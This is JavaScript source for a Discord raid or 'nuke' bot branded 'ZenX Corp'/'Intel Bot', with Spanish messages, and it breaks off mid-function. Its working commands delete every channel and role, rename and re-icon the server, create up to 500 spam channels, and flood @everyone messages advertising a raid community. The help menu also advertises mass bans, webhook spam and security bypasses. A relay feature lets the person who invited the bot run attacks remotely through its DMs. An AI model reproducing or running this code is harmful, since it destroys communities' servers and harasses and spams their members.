// ayuda
const { Client, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient, PermissionsBitField, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActivityType, PermissionOverwrites, PermissionFlagsBits, Embed, IntentsBitField, Colors, Presence, PresenceManager, embedLength, ReactionUserManager, NewsChannel} = require('discord.js');
const client = new Client({intents: [103423]});
const gradient = require('gradient-string');
async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
const chalk = require('chalk');
const fetch = require('node-fetch');
const bot_token = "";
const prefix_1 = "$";
const prefix_2 = "&";
const prefix_3 = "#";
let users_data = {};
const raid_canal_nombres = ["Pwned By wapned", "Pwned By wapned", "Pwned By wapned", "Pwned By wapned", "Pwned By wapned", "Pwned By wapned"];
function banner() {
    console.log(gradient(['#ff0008', '#9e00fa'])(`
     _    _                            _  ______           _ _ _    _   
    | |  | |                          | | | ___ \\         | (_) |  | |  
    | |  | | __ _ _ __  _ __   ___  __| | | |_/ /___ _ __ | |_| | _| |_ 
    | |/\\| |/ _\` | '_ \\| '_ \\ / _ \\/ _\` | |    // _ \\ '_ \\| | | |/ / __|
    \\  /\\  / (_| | |_) | | | |  __/ (_| | | |\\ \\  __/ |_) | | |   <| |_ 
     \\/  \\/ \\__,_| .__/|_| |_|\\___|\\__,_| \\_| \\_\\___| .__/|_|_|_|\\_\\\\__|
                 | | by $ ZenX Corp                 | |                 
                 |_|                                |_|                 
    `));
};
client.on('ready', async () => {
    console.clear();
    banner();
    console.log(gradient(['#b700fa', '#ff00e6'])(`
    [i] Bot username: ${client.user.username}
    [i] Bot ID: ${client.user.id}
    [i] Invite link: https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot
    
    -- ${client.user.username} ready for att4ck. --
    `));
});
async function leave_guild(guild, usr) {
    try {
        await wait_ms(1800_000);
        await guild.leave();
        await usr.send({embeds:[new EmbedBuilder().setDescription(`:gem: El bot se salió del servidor **\`${guild.name}\`**`)]})
    } catch (e) {
        console.log(e.message);
    };
};
client.on('guildCreate', async (guild) => {
    try {
        if (!guild.members.me.permissions.has('ViewAuditLog')) {
            console.log(`No tengo permisos para ver los registros de auditoría en ${guild.name}`);
            return;
        }
        const auditLogs = await guild.fetchAuditLogs({
            type: 28,
            limit: 1,
        });
        const entry = auditLogs.entries.first();
        if (entry && entry.target.id === client.user.id) {
            const inviteitor = entry.executor;
            try {
                leave_guild(guild, inviteitor);
            } catch (e) {
                console.log(e.message)
            }
            await inviteitor.send({embeds:[
                new EmbedBuilder()
                .setTitle(`Gracias por anadir el bot!`)
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(`💎 guild: \`${guild.name}\`\n💎 members: \`${guild.memberCount}\`\n\n🕵️ \`${prefix_1}join ${guild.id}\`\nPara ver la lista de comandos pon \`help\`.\nAdvertencia: El bot se va a salir del servidor en **30 minutos**.`)
                .setFooter({text:`Wapned on top!`})
            ]});
            await inviteitor.send({embeds:[
                new EmbedBuilder()
                .setDescription(`Recomendamos que le des el rol **mas alto posible** al bot.`)
            ]})
        } else {
            return;
        }
    } catch (error) {
        console.error(`Error al obtener los registros de auditoría: ${error.message}`);
    }
});
client.on(`messageCreate`,async(msg)=>{
    const args1 = msg.content.slice(prefix_1.length).trim().split(/ +/);
    const command_1 = args1.shift().toLowerCase();
    const args2 = msg.content.slice(prefix_2.length).trim().split(/ +/);
    const command_2 = args2.shift().toLowerCase();
    const args3 = msg.content.slice(prefix_3.length).trim().split(/ +/);
    const command_3 = args3.shift().toLowerCase();
    const content_3 = args3.join(' ');
    if(msg.content === prefix_1+"invite"){
        try {
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setDescription(`💎\n[Invítame aquí](https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot)`)
            ]});
            if(msg.channel.isDMBased()){
                return;
            };
            await msg.reply({embeds:[
                new EmbedBuilder()
                .setTitle('💎 Revisa tu MD!')
            ]});
        } catch (e) {
            console.log(e.message);
        }
    }
    if(msg.content === prefix_1+"help" || msg.content === prefix_1+"cmds"){
        try {
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setTitle(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 💎 wapned commands`)
                .setDescription(`‎\n:detective: \`${prefix_1}join <id>\` Remotely use all commands\n:detective: \`${prefix_1}join help\` help command of \`${prefix_1}join\`\n\n🛠️ **normal;**\n🦇 \`${prefix_1}on\` Destroy server\n🦇 \`${prefix_1}nuke\` Delete all channels.\n🦇 \`${prefix_1}channels\` Create channels.\n🦇 \`${prefix_1}spam\` Spam channels.\n🦇 \`${prefix_1}raid\` Create and spam channels.\n🦇 \`${prefix_1}massban\` Ban all users.\n🦇 \`${prefix_1}createroles\` Create roles.\n🦇 \`${prefix_1}deleteroles\` Delete all roles.\n\n🛠️ **new;**\n🦇 \`${prefix_1}activitymassban\` Ban active users.\n🦇 \`${prefix_1}banboosters\` Ban all boosters.\n🦇 \`${prefix_1}banbots\` Ban all bots.\n🦇 \`${prefix_1}onlinemassban\` Ban all online users.\n🦇 \`${prefix_1}massunban\` Unban all users.\n🦇 \`${prefix_1}viewhooks\` View existent webhooks.\n🦇 \`${prefix_1}fuckhook <url>\` Fuck webhook.\n🦇 \`${prefix_1}delemojis\` Delete all emojis.\n🦇 \`${prefix_1}massnick\` Change all nicks\n🦇 \`${prefix_1}leave\` Log out of the server.\n🦇 \`${prefix_1}guild\` Change name & icon.\n🦇 \`${prefix_1}classic\` Classic raid (slow spam).\n🦇 \`${prefix_1}createemojis\` Create emojis.\n\n🛠️ **bypass;**\n🦇 \`${prefix_1}renameroles\` Rename all roles.\n🦇 \`${prefix_1}wbspam\` Create and spam webhooks.\n🦇 \`${prefix_1}existentwbspam\` Spam existent webhooks.\n🦇 \`${prefix_1}bypass\` Bypass server security.\n🦇 \`${prefix_1}autobypass\` Inteligente bypass server security.\n\n🦇 \`${prefix_1}top\` View top 10 raids.\n\n👑 \`${prefix_1}premium_commands\` View premium commands.\n👑 \`${prefix_1}cmds\` View premium commands.\n\n🔫 \`${prefix_1}invite\` Send bot invite.\n\n:no_entry: **WARNING** \nNo nos hacemos responsables del uso que se le de a este bot.\nWe are not responsible for the use that is given to this bot.\n\n***[i] Gracias [0xpl0it](https://guns.lol/0xpl0it) por explicarme los comandos e.e***`)
                .setImage(`https://c.tenor.com/OCHd_PtwaVMAAAAd/tenor.gif`)
            ]});
            if(msg.channel.isDMBased()){
                return;
            };
            await msg.reply({embeds:[
                new EmbedBuilder()
                .setTitle('💎 Revisa tu MD!')
            ]});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(command_1 === "join"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let invxd = "";
            try {
                const guildxd = client.guilds.cache.get(args1[0]);
                const channel = guildxd.channels.cache.find(channel => channel.type === ChannelType.GuildText);
                const invite = await channel?.createInvite({
                    maxAge: 10 * 60 * 1000,
                    maxUses: 1,
                });
                invxd = invite?.code || 'desconocida';
            } catch (e) {
                console.log(e.message);
                if(e.message == "Cannot read properties of undefined (reading 'channels')"){
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`> No se encontró el servidor.`)]});
                    return; 
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`> Ocurrió un error en el comando, comunicate con brizli XD.`)]});
                    return; 
                };
            };
            const guildxd = client.guilds.cache.get(args1[0]);
            users_data[msg.author.id] = {
                guild_id: args1[0]
            };
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setTitle(` ‎                                                    ‎ :gem:`)
                .setDescription(`Se ha seleccionado el servidor: **${guildxd.name}**\n\ninvite: https://discord.gg/${invxd} \n\n:earth_americas: **Español:** Cualquier comando que pongas en este **MD** va a ejecutarse en el servidor seleccionado.`)
            ]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_1+"on"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            let nm_ch_atck = users_data[msg.author.id]?.nm_channels_attack ? users_data[msg.author.id].nm_channels_attack : "zenx-on-top";
            const guildxd = client.guilds.cache.get(guildxd_id);
            guildxd.setName("Dominated by $ ZenX Corp");
            guildxd.setIcon("https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=1024")
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 Intel Bot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`Intel Bot  on top!`})
            ]});
            let nk = false;
            let nk_number = 0;
            async function delete_ch(ch_id, ch_size) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}`,{
                        method:"DELETE",
                        headers:{
                            "Authorization":`Bot ${bot_token}`,
                            "Content-Type":"application/json"
                        },
                        body: JSON.stringify({
                            "X-Audit-Log-Reason":"IntelBot ontop"
                        })
                    });
                    const resJson = await res.json();
                    if(res.status === 429){
                        console.log(chalk.cyan(`[i] Se detectó rate limite de ${chalk.white(`${resJson['retry_after']}`)}, reintentando...`));
                        await wait_ms(resJson['retry_after']);
                        await delete_ch(ch_id);
                    };
                    if(res.status === 200){
                        nk_number++;
                    };
                    if(!nk && nk_number === ch_size){
                        nk = true;
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:skull: ${nk_number} canales del servidor eliminados correctamente.`)]})
                    };
                } catch (e) {
                    
                }
            };
            const chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                delete_ch(ch.id, chs.size);
            };
            async function del_roles() {
                let rl_number = 0;
                const rolesxd = await guildxd.roles.fetch();
                for (let rolxd of rolesxd.values()) {
                    try {
                        await rolxd.delete();
                        rl_number++;
                    } catch (e) {
                        console.log(e.message);
                    }
                };
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:skull: ${rl_number} roles eliminados correctamente.`)]})
            };
            del_roles();
            async function spam_ch(ch_id) {
                try {
                    const chxd = guildxd.channels.cache.get(ch_id);
                    for (let index = 0; index < 30; index++) {
                        try {
                            chxd.send({content:`** https://discord.gg/AYRAD4jUdB **\n${txt_atck_}\n${inv_atck} \n@everyone`, embeds:[
                                new EmbedBuilder()
                                .setTitle(` ‎                           ‎ **SERVER FUCKED BY Intel Bot**\n ‎                                 ‎ **#INTEL DOMINA**`)
                                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/AYRAD4jUdB)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/AYRAD4jUdB`)
                                .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                            ]});
                        } catch (e) {};
                    };
                } catch (e) {}
            };
            let raidk = false;
            let raidk_number = 0;
            async function crear_ch(channel_name) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/guilds/${guildxd.id}/channels`, {
                        method: 'POST',
                        headers: {
                            "Authorization": `Bot ${bot_token}`,
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            name: `${channel_name}`,
                            type: 0
                        }),
                    });
                    const resJson = await res.json();
                    if(res.status === 429){
                        await wait_ms(resJson["retry_after"]);
                        if(nm_ch_atck === "zenx-on-top"){
                            const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                            await crear_ch(raid_canal_nombres[randomNameIndex]);
                        } else {
                            await crear_ch(nm_ch_atck);
                        };
                    } else {
                        raidk_number++;
                    };
                    if(raidk_number === 500 && !raidk){
                        raidk = true
                        const chs = await guildxd.channels.fetch();
                        for (let ch of chs.values()) {
                            spam_ch(ch.id);
                        };
                        return;
                    };
                } catch (e) {
                    console.log(e.message);
                };
            };
            for (let index = 0; index < 500; index++) {
                if(nm_ch_atck === "zenx-on-top"){
                    const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                    crear_ch(raid_canal_nombres[randomNameIndex]);
                } else {
                    crear_ch(nm_ch_atck);
                };
                await wait_ms(10);
            };
            msg.author.send({embeds:[new EmbedBuilder().setDescription(`:skull: ${raidk_number} canales creados correctamente.`)]})
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"nuke"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`Intel Bot DOMINA!`})
            ]});
            let nk = false;
            let nk_number = 0;
            async function delete_ch(ch_id, ch_size) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}`,{
                        method:"DELETE",
                        headers:{
                            "Authorization":`Bot ${bot_token}`,
                            "Content-Type":"application/json"
                        },
                        body: JSON.stringify({
                            "X-Audit-Log-Reason":"Intel bot"
                        })
                    });
                    const resJson = await res.json();
                    if(res.status === 429){
                        console.log(chalk.cyan(`[i] Se detectó rate limite de ${chalk.white(`${resJson['retry_after']}`)}, reintentando...`));
                        await wait_ms(resJson['retry_after']);
                        await delete_ch(ch_id);
                    };
                    if(res.status === 200){
                        nk_number++;
                    };
                    if(!nk && nk_number === ch_size){
                        nk = true;
                        await guildxd.channels.create({type:ChannelType.GuildText, name:`nuked-by-zenx`}).then(async(ch)=>{await ch.send({content:` https://discord.gg/AYRAD4jUdB \n https://discord.gg/AYRAD4jUdB\n@everyone`, embeds:[
                            new EmbedBuilder()
                            .setTitle(` ‎                           ‎ **SERVER FUCKED BY Intel**\n ‎                                 ‎ **#Intel bot**`)
                            .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/AYRAD4jUdB)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/AYRAD4jUdB`)
                            .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                        ]});})
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:skull: ${nk_number} canales del servidor eliminados correctamente.`)]});
                    };
                } catch (e) {
                    console.log(e.message);
                }
            };
            const chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                delete_ch(ch.id, chs.size);
            };
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"channels"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let nm_ch_atck = users_data[msg.author.id]?.nm_channels_attack ? users_data[msg.author.id].nm_channels_attack : "Intel-on-top";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 Intel Bot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`Intel Bot on top!`})
            ]});
            let raidk = false;
            let raidk_number = 0;
            async function crear_ch(channel_name) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/guilds/${guildxd.id}/channels`, {
                        method: 'POST',
                        headers: {
                            "Authorization": `Bot ${bot_token}`,
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            name: `${channel_name}`,
                            type: 0
                        }),
                    });
                    const resJson = await res.json();
                    if(res.status === 429){
                        await wait_ms(resJson["retry_after"]);
                        if(nm_ch_atck === "zenx-on-top"){
                            const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                            await crear_ch(raid_canal_nombres[randomNameIndex]);
                        } else {
                            await crear_ch(nm_ch_atck);
                        }
                    } else {
                        raidk_number++;
                    };
                    if(raidk_number === 500 && !raidk){
                        raidk = true
                        return;
                    };
                } catch (e) {
                    console.log(e.message)
                }
            };
            for (let index = 0; index < 500; index++) {
                if(nm_ch_atck === "Intel-on-top"){
                    const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                    crear_ch(raid_canal_nombres[randomNameIndex]);
                } else {
                    crear_ch(nm_ch_atck);
                }
                await wait_ms(10);          
            };
            msg.author.send({embeds:[new EmbedBuilder().setDescription(`:skull: ${raidk_number} canales creados correctamente.`)]})
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"spam"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 Intel Bot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`Intel Bot on top!`})
            ]});
            async function spam_ch(ch_id) {
                const chxd = guildxd.channels.cache.get(ch_id);
                for (let index = 0; index < 30; index++) {
                    try {
                        chxd.send({content:`** https://discord.gg/AYRAD4jUdB **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                            new EmbedBuilder()
                            .setTitle(` ‎                           ‎ **SERVER FUCKED BY IntelBot**\n ‎                                 ‎ **#IntelBot**`)
                            .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/AYRAD4jUdB)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/AYRAD4jUdB`)
                            .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                        ]});
                    } catch (e) {};
                };
            };
            const chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                spam_ch(ch.id);
            };
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"raid"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            let nm_ch_atck = users_data[msg.author.id]?.nm_channels_attack ? users_data[msg.author.id].nm_channels_attack : "zenx-on-top";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            async function spam_ch(ch_id) {
                try {
                    const chxd = guildxd.channels.cache.get(ch_id);
                    for (let index = 0; index < 30; index++) {
                    try {
                        chxd.send({content:`** https://discord.gg/AYRAD4jUdB **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                            new EmbedBuilder()
                            .setTitle(` ‎                           ‎ **SERVER FUCKED BY IntelBot**\n ‎                                 ‎ **#IntelBot**`)
